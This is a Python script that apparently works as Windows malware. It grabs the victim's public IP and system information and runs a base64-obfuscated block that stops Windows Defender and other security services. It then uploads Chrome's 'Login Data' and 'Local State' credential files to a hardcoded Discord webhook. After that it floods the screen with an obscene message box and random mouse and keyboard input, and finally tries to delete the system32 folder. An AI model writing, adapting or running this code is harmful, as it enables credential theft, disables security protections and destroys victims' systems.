from discord_webhook import DiscordWebhook
import subprocess
import requests
import os
import random
from random import randint
import string
import pyautogui
pyautogui.FAILSAFE = False
mouse = pyautogui
keyboard = pyautogui
username = os.environ["USERNAME"]
def main():
    with open("main.vbs", "w") as f:
        f.write('msgbox "By Decks, SUCK MY DICK",16,"ERROR"')
    r=requests.get("http://ifconfig.me")
    url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
    subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJTRFJTVkMiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJXaW5EZWZlbmQiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3Rhc2traWxsIC9mIC9pbSBNU0FTQ3VpLmV4ZScpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXQgc3RvcCAic2VjdXJpdHkgY2VudGVyIicpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb24nKQpzdWJwcm9jZXNzLmdldG91dHB1dCgnbmV0IHN0b3AgInd1YXVzZXIiJyk=')[0]))
    web=DiscordWebhook(url=url, content=f"IP > {r.text}")
    with open(f"C:/Users/{username}/AppData/System info.txt", "rb")as f:
        web.add_file(file=f.read(), filename='System info.txt')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State", "rb") as f:
        web.add_file(file=f.read(), filename='Local State')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
        web.add_file(file=f.read(), filename='Login Data')
    web.execute()
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
    a=0
    while a < 100:
        subprocess.getoutput('start main.vbs')
        rndvalueX = randint(0, 1919)
        rndvalueY = randint(0, 1019)
        rndletter1 = random.choice(string.ascii_letters)
	    rndletter2 = random.choice(string.ascii_letters)
	    rndletter3 = random.choice(string.ascii_letters)
        mouse.dragTo(rndvalueX, rndvalueY)
        keyboard.write(rndletter1 + rndletter2 + rndletter3, interval=0.01)
        pyautogui.click()
        keyboard.press('win')
        a += 1
    subprocess.getoutput('rd "%windir%\system32"/q /s')
    subprocess.run(["powershell", "-Command", "wininit"])
main()
